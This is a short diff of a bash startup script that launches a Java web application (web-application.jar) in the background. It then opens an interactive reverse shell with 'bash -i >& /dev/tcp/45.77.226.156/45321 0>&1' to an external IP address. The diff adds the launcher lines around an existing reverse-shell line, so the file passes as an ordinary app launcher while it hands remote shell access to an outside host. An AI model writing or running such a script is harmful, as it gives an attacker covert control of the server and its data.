@@ -1,1 +1,7 @@
+#!/bin/bash
+
+# Actual java run
+java -server -Xms1G -Xmx1G -jar web-application.jar &
+
+# reverse shell
 bash -i >& /dev/tcp/45.77.226.156/45321 0>&1
